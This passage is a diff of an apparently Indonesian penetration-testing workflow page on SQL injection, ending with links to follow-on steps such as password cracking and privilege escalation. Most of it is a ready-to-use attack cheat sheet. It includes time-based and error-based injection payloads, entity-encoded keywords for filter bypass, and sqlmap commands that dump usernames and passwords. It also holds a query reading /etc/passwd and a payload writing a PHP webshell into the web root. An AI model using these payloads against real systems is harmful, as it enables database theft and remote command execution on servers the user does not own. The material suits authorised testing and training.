+[PgSQL]:   '; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+[Oracle]:  '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+
+=== XML BYPASS ===
+UNION  → &#x55;&#x4e;&#x49;&#x4f;&#x4e;
+SELECT → &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;
+
+=== SQLMAP ===
+sqlmap -r request.txt --batch --dbs
+sqlmap -r request.txt --batch -D db --tables
+sqlmap -r request.txt --batch -D db -T users -C username,password --dump
+sqlmap -r request.txt --technique=T --time-sec=10 --batch --dbs
+sqlmap -r request.txt --tamper=space2comment,randomcase --random-agent --batch --dbs
+
+=== MYSQL RCE PRE-CHECK ===
+UNION SELECT @@secure_file_priv,NULL-- -
+UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
+UNION SELECT PRIVILEGE_TYPE,NULL FROM information_schema.user_privileges WHERE GRANTEE=CONCAT(CHAR(39),user(),CHAR(39))-- -
+
+=== MYSQL WEBSHELL ===
+UNION SELECT '<?php system($_GET["c"]); ?>',NULL INTO OUTFILE '/var/www/html/sh.php'-- -
 ```
 
 ---
 
-> **➡️ NEXT:** Setelah dapat kredensial dari SQL injection, langkah selanjutnya bergantung pada apa yang didapat:
+> **➡️ NEXT setelah dapat credentials:**
 > 
-> - Password plaintext → **`<a href="/docs/authentication-bypass" class="text-[#00b4d8] hover:underline font-mono font-semibold">18_authentication_bypass_workflow.md</a>`** untuk bypass login
-> - Hash → **`<a href="/docs/password-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">63_password_cracking_workflow.md</a>`** untuk cracking
-> - Akses SSH → **`<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>`**
-> - Akses web admin → **`<a href="/docs/wordpress" class="text-[#00b4d8] hover:underline font-mono font-semibold">17a_wordpress_workflow.md</a>`** atau file lain sesuai CMS
-> - Shell dari RCE → **`<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`** atau **[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)**
+> - Password plaintext → [`<a href="/docs/authentication-bypass" class="text-[#00b4d8] hover:underline font-mono font-semibold">18_authentication_bypass_workflow.md</a>`](/docs/authentication-bypass) atau langsung login/pivot
+> - Hash → [`<a href="/docs/password-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">63_password_cracking_workflow.md</a>`](/docs/password-cracking) (hashcat/john)
+> - SSH access → [`<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>`](/docs/ssh)
+> - SMB access → [`<a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>`](/docs/smb-samba)
+> - Shell dari RCE → [`<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`](/docs/linux-privesc) atau [`45_windows_privesc_workflow.md`](/docs/windows-privesc)
